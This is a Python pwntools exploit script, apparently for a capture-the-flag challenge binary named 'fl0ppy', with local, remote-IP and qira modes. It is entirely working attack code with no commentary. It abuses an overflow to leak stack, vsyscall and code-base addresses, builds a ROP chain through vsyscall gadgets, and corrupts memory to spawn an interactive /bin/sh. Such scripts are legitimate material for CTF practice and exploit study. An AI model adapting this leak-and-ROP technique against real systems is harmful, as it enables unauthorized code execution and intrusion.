#!/usr/bin/env python

from pwn import *

mode = 'local'
if mode == 'remote':
  p = remote('175.119.158.134', 5559)
elif mode == 'qira':
  p = remote ('plus.or.kr', 9036)
else:
  #p = remote ('localhost', 9003)
  p = process ('./fl0ppy')

DEBUG = True
def r(s):
    recv = p.recvuntil(s)
    #if DEBUG:
    #    print recv

def choose(num):
    r('>\n')
    p.sendline('1')
    r('1 or 2?\n\n')
    p.sendline(str(num))

def write(data, desc):
    r('>\n')
    p.sendline('2')
    r('data: \n\n')
    p.send(data)
    r('Description: \n\n')
    p.send(data)

def modify(data):
    r('>\n')
    p.sendline('4')
    r('2 Data\n\n')
    p.sendline('1')
    r('Description: \n\n')
    p.send(data)

def leak():
    r('>\n')
    p.sendline('3')
    r('DESCRIPTION: ')
    desc = p.recvline()[:-1]
    r('DATA: ')
    data = p.recvline()[:-1]
    return (desc, data)

def jump():
    r('>\n')
    p.sendline('5')

def leak_addr(addr):
    choose(2)
    modify('a' * 20 + p32(addr) + 'x')

    if DEBUG:
      print "leak_addr: " + hex(addr)

    choose(1)
    return leak()[1]

# init
choose(2)
write('/bin/sh', '222')
choose(1)
write('first', '111')

# leak stack pointer
modify('a' * 17)

stack_addr = u32(leak()[0][16:20])
log.success('pointer addr: 0x%x' % stack_addr)


# leak vsyscall
if mode == 'remote':
  vsyscall_addr = u32(leak_addr(stack_addr - 0xa94 + 0xb90)[:4])
elif mode == 'qira':
  vsyscall_addr = u32(leak_addr(stack_addr + 0x150)[:4])
else:
  vsyscall_addr = u32(leak_addr(stack_addr + 0x164)[:4])

log.success('vsyscall addr: 0x%x' % vsyscall_addr)

print leak_addr (vsyscall_addr).encode ("hex")

# leak main
main_addr = u32(leak_addr(stack_addr - 0xa94 + 0xb40)[:4])
log.success('main addr: 0x%x' % main_addr)

main_ret = stack_addr + 0x38
code_base = main_addr - 0xf5a

strlen_addr = code_base + 0x9b0
printmenu_addr = code_base + 0xb85

popebx_addr = code_base + 0x8f1 # pop ebx ; ret
string_addr = code_base + 0x138b # 'nput Data: '
poppopret_addr = vsyscall_addr + 17

argv_addr = stack_addr + 0xd4
envp_addr = argv_addr

if DEBUG:
  print map(lambda x: hex(x), [main_ret, code_base, strlen_addr, popebx_addr, string_addr])

data_addr = u32(leak_addr(stack_addr - 20)[:4])

print leak_addr(data_addr)

choose(2)
modify('/bin/sh;' + 'b'*12 + p32(main_ret) + 'c')

payload = p32 (printmenu_addr)

#payload += "AAAA"

payload += p32 (popebx_addr)
payload += p32 (data_addr)

#payload += "AAAA"
payload += p32 (poppopret_addr)

payload += p32 (envp_addr)
payload += p32 (argv_addr)

#payload += "AAAA"
payload += p32 (vsyscall_addr)

#payload = p32 (main_addr)

if DEBUG:
  print payload.encode ("hex")

choose (1)

r('>\n')
p.sendline('4')
r('2 Data\n\n')
p.sendline('2')
r('Input Data: ')
p.send(payload)

#modify ('/bin/sh;  ')


choose (2)
modify ("/bin/sh\x00\x00")

jump ()

r('>\n')
p.sendline('11')

p.interactive ()

p.close ()
